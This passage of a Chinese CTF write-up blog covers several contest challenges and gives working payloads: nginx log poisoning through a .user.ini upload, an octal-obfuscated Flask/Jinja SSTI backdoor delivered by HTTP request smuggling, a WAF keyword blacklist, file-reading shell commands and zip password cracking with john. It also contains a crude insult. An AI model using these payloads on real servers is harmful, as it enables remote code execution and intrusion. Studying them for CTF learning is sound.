class="property">_0x34a3a3</span>, _0x11e4ba.<span class="property">_0x67fb88</span>, _0x11e4ba.<span class="property">_0x4337fa</span>, _0x11e4ba.<span class="property">_0x2d8f19</span>)](confirm, _0x12c806);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_0x2f5b69</span>(<span class="params">_0xfde3ce, _0x57f13f, _0x4cdb67, _0x13e691</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_0x43b95d</span>(_0x57f13f - -_0x28ad78.<span class="property">_0x5cc3bd</span>, _0x13e691, _0x4cdb67 - _0x28ad78.<span class="property">_0x17ef46</span>, _0x13e691 - _0x28ad78.<span class="property">_0x53dab6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    _0x8bd32d[<span class="title function_">_0xf4e5c</span>(_0x11e4ba.<span class="property">_0x16ffa7</span>, _0x11e4ba.<span class="property">_0x29c7a0</span>, _0x11e4ba.<span class="property">_0x4fd058</span>, _0x11e4ba.<span class="property">_0x1eed2e</span>)](confirm, _0x8bd32d[<span class="string">&#x27;rjCiw&#x27;</span>]),</span><br><span class="line">    _0x8bd32d[<span class="title function_">_0xf4e5c</span>(_0x11e4ba.<span class="property">_0x3d8cce</span>, _0x11e4ba.<span class="property">_0x135008</span>, _0x11e4ba.<span class="property">_0x1548b1</span>, _0x11e4ba.<span class="property">_0x1aa760</span>)](confirm, <span class="title function_">_0xf4e5c</span>(_0x11e4ba.<span class="property">_0x229bf7</span>, <span class="number">0x23d</span>, _0x11e4ba.<span class="property">_0xe6db95</span>, _0x11e4ba.<span class="property">_0x3aa31e</span>) + <span class="title function_">_0x2f5b69</span>(<span class="number">0xcd</span>, <span class="number">0xb3</span>, _0x11e4ba.<span class="property">_0x3c19c3</span>, _0x11e4ba.<span class="property">_0x52b346</span>) + <span class="title function_">_0xf4e5c</span>(_0x11e4ba.<span class="property">_0x48ed1f</span>, _0x11e4ba.<span class="property">_0x5d4762</span>, _0x11e4ba.<span class="property">_0x3c9e76</span>, _0x11e4ba.<span class="property">_0x2a9f09</span>));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><a href="https://obf-io.deobfuscate.io/">https://obf-io.deobfuscate.io/</a></p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-141449.jpg" alt="1"></p><p>访问<code>/rqxvweqtyfshbs.php</code></p><h2 id="奶龙牌图片处理器2-0"><a href="#奶龙牌图片处理器2-0" class="headerlink" title="奶龙牌图片处理器2.0"></a>奶龙牌图片处理器2.0</h2><p>nginx直接上传<code>.user.ini</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>175.27.251.122:33165</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://175.27.251.122:33165</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://175.27.251.122:33165/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=node0jmgnupaoej9r7mqglbiahyzu4.node0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryoIjdcuXv5OADAN7I</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36;&lt;?php phpinfo();?&gt;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>366</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryoIjdcuXv5OADAN7I</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_append_file=/var/<span class="keyword">log</span>/nginx/<span class="keyword">access</span>.<span class="keyword">log</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryoIjdcuXv5OADAN7I--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-113446.jpg" alt="1"></p><p>重新开个靶机上传木马即可</p><h2 id="Try2Crossover"><a href="#Try2Crossover" class="headerlink" title="Try2Crossover"></a>Try2Crossover</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, render_template_string, abort</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">books = [</span><br><span class="line">    &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;the great gatsby&quot;</span>, <span class="string">&quot;author&quot;</span>: <span class="string">&quot;F. Scott Fitzgerald&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;to kill a lockingbird&quot;</span>, <span class="string">&quot;author&quot;</span>: <span class="string">&quot;Harper Lee&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;id&quot;</span>: <span class="number">3</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;1984&quot;</span>, <span class="string">&quot;author&quot;</span>: <span class="string">&quot;George Orwell&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">code</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;waf&quot;</span>, <span class="string">&quot;before&quot;</span>, <span class="string">&quot;after&quot;</span>, <span class="string">&quot;error&quot;</span>, <span class="string">&quot;teardown&quot;</span>, <span class="string">&quot;context&quot;</span>, <span class="string">&quot;appcontext&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;stack&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;count&quot;</span>, <span class="string">&quot;\\x&quot;</span>, <span class="string">&quot;original&quot;</span>,<span class="string">&quot;request&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(pattern <span class="keyword">in</span> code <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklist):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">        </span><br><span class="line">original_code = waf.__code__</span><br><span class="line">original_name = waf.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_book&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_book</span>():</span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    author = request.form.get(<span class="string">&#x27;author&#x27;</span>)</span><br><span class="line">    waf(title)</span><br><span class="line">    waf(author)</span><br><span class="line"></span><br><span class="line">    book_id = <span class="built_in">len</span>(books) + <span class="number">1</span></span><br><span class="line">    books.append(&#123;<span class="string">&quot;id&quot;</span>: book_id, <span class="string">&quot;title&quot;</span>: title, <span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit_book/&lt;int:book_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params">book_id</span>):</span><br><span class="line">    book = <span class="built_in">next</span>((b <span class="keyword">for</span> b <span class="keyword">in</span> books <span class="keyword">if</span> b[<span class="string">&quot;id&quot;</span>] == book_id), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        book[<span class="string">&quot;title&quot;</span>] = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">        book[<span class="string">&quot;author&quot;</span>] = request.form.get(<span class="string">&#x27;author&#x27;</span>)</span><br><span class="line">        waf(book[<span class="string">&#x27;title&#x27;</span>])</span><br><span class="line">        waf(book[<span class="string">&#x27;author&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit_book.html&#x27;</span>, book=book)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/details/&lt;int:id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">details</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    book = <span class="built_in">next</span>((b <span class="keyword">for</span> b <span class="keyword">in</span> books <span class="keyword">if</span> b[<span class="string">&quot;id&quot;</span>] == <span class="built_in">id</span>), <span class="literal">None</span>)</span><br><span class="line">    book_author = book.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">    waf(book_author)</span><br><span class="line"></span><br><span class="line">    tem = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Book Details&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Book Details&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;ID: &#123;&#123; book.id &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Title: &#123;&#123; book.title|capitalize_title &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;No other info.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line">    render_template_string(book_author)</span><br><span class="line">    <span class="keyword">if</span> waf.__code__ != original_code <span class="keyword">or</span> waf.__name__ != original_name:</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tem, book_author=book_author, book=book, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/forbidden&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;forbidden!!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;capitalize_title&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">capitalize_title</span>(<span class="params">title</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(word.capitalize() <span class="keyword">for</span> word <span class="keyword">in</span> title.split())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Username: <span class="subst">&#123;username&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本来不想动脑的，稍微看了一下好像八进制可以绕过，我之前蜀道山出的那道题目预期也是如此，现在只需要将payload优化即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for[&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;][&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;][&quot;\145\166\141\154&quot;](&quot;\141\160\160.\141\146\164\145\162\137\162\145\161\165\145\163\164\137\146\165\156\143\163.\163\145\164\144\145\146\141\165\154\164(None, []).\141\160\160\145\156\144(lambda \162\145\163\160: \103\155\144\122\145\163\160 if \162\145\161\165\145\163\164.\141\162\147\163.\147\145\164(&#x27;\143\155\144&#x27;) and \145\170\145\143(\&quot;\147\154\157\142\141\154 \103\155\144\122\145\163\160;\103\155\144\122\145\163\160=\137\137\151\155\160\157\162\164\137\137(&#x27;\146\154\141\163\153&#x27;).\155\141\153\145\137\162\145\163\160\157\156\163\145(\137\137\151\155\160\157\162\164\137\137(&#x27;\157\163&#x27;).\160\157\160\145\156(\162\145\161\165\145\163\164.\141\162\147\163.\147\145\164(&#x27;\143\155\144&#x27;)).\162\145\141\144())\&quot;)==None else \162\145\163\160)&quot;, &#123;&quot;\162\145\161\165\145\163\164&quot;:url_for[&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;][&quot;\162\145\161\165\145\163\164&quot;],&quot;\141\160\160&quot;:url_for[&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;][&quot;current_app&quot;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, abort</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;waf&quot;</span>, <span class="string">&quot;before&quot;</span>, <span class="string">&quot;after&quot;</span>, <span class="string">&quot;error&quot;</span>, <span class="string">&quot;teardown&quot;</span>, <span class="string">&quot;context&quot;</span>, <span class="string">&quot;appcontext&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;stack&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;count&quot;</span>, <span class="string">&quot;\\x&quot;</span>, <span class="string">&quot;original&quot;</span>, <span class="string">&quot;request&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_check</span>(<span class="params">input_str</span>):</span><br><span class="line">    matched = []</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> pattern.lower() <span class="keyword">in</span> input_str.lower():</span><br><span class="line">            matched.append(pattern)</span><br><span class="line">    <span class="keyword">return</span> matched</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;bao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    matches = waf_check(name)</span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[WAF Blocked] 匹配到黑名单内容: <span class="subst">&#123;matches&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    template = <span class="string">f&#x27;&lt;h1&gt;Hi, <span class="subst">&#123;name&#125;</span>.&lt;/h1&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>本地测试了一下，肯定是绕过了的，但是远程不知道为什么没通，后面看到hint说有中间件作为反代，需要进行请求走私</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">Sec-Websocket-Key1</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">xxxxxxxxGET</span> /other HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: example.com</span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure><p>网上给的是这种，那这题就是这样的</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>175.27.251.122:10001</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>388</span><br><span class="line"><span class="attribute">Sec-Websocket-Key1</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">usernamePOST /add_book HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-llvm">Host: <span class="number">175.27</span>.<span class="number">251.122</span>:<span class="number">10001</span></span></span><br><span class="line"><span class="language-llvm">Content-Length: <span class="number">284</span></span></span><br><span class="line"><span class="language-llvm">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span></span><br><span class="line"><span class="language-llvm">Connection: close</span></span><br><span class="line"><span class="language-llvm"></span></span><br><span class="line"><span class="language-llvm">title<span class="operator">=</span>test&amp;author<span class="operator">=</span>&#123;&#123;get_flashed_messages[<span class="string">&quot;<span class="char escape_">\13</span>7<span class="char escape_">\13</span>7<span class="char escape_">\14</span>7<span class="char escape_">\15</span>4<span class="char escape_">\15</span>7<span class="char escape_">\14</span>2<span class="char escape_">\14</span>1<span class="char escape_">\15</span>4<span class="char escape_">\16</span>3<span class="char escape_">\13</span>7<span class="char escape_">\13</span>7&quot;</span>][<span class="string">&quot;<span class="char escape_">\13</span>7<span class="char escape_">\13</span>7<span class="char escape_">\14</span>2<span class="char escape_">\16</span>5<span class="char escape_">\15</span>1<span class="char escape_">\15</span>4<span class="char escape_">\16</span>4<span class="char escape_">\15</span>1<span class="char escape_">\15</span>6<span class="char escape_">\16</span>3<span class="char escape_">\13</span>7<span class="char escape_">\13</span>7&quot;</span>][&#x27;\<span class="number">137</span>\<span class="number">137</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">160</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">164</span>\<span class="number">137</span>\<span class="number">137</span>&#x27;](&#x27;os&#x27;).popen(&#x27;sleep <span class="number">5</span>&#x27;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-213511.jpg" alt="1"></p><p>不知道为什么，用yakit做不了，把flag写到静态目录，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir static;ls /&gt;static/3.txt</span><br><span class="line">mkdir static;cat f*&gt;static/3.txt</span><br></pre></td></tr></table></figure><p>傻逼环境我测你妈</p><h2 id="small-challenge"><a href="#small-challenge" class="headerlink" title="small_challenge"></a>small_challenge</h2><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-114744.jpg" alt="1"></p><p><code>binwalk -e 1.png</code>，有两个图，先双图合并试试</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-115224.jpg" alt="1"></p><p><a href="https://zxing.org/w/decode.jspx">https://zxing.org/w/decode.jspx</a> 解密，解密结果放到随波逐流里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UV!W_X_YZ,U,Y∈[0,9], V,W,X,Z∈[A,z]</span><br></pre></td></tr></table></figure><p>直接掩码爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip2john flag.zip &gt;zip1.txt</span><br><span class="line"></span><br><span class="line">john --mask=&#x27;?d[A-Za-z]![A-Za-z]_[A-Za-z]_?d[A-Za-z]&#x27; zip1.txt --format=pkzip --fork=4</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-121746.jpg" alt="1"></p><p>就是压缩包密码</p><h2 id="数学天才"><a href="#数学天才" class="headerlink" title="数学天才"></a>数学天才</h2><blockquote><p>试炼一和试练二两个一起看解压葵花宝典</p><p>试炼一：斜下对角线的数字，是打开葵花宝典的密钥。<br>试炼二：为师不想要死，为师喜欢$。</p></blockquote><p>经过分析得知</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-131940.jpg" alt="1"></p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250525-090901.jpg" alt="1"></p><p>得到密码<code>295$25$23</code>，随波得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;E3@1_Z@gu_t3avh5!&#125;</span><br><span class="line"></span><br><span class="line"># 有好几个有意义的挨着交</span><br><span class="line">flag&#123;R3@1_M@th_g3niu5!&#125;</span><br></pre></td></tr></table></figure><h2 id="001"><a href="#001" class="headerlink" title="001"></a>001</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 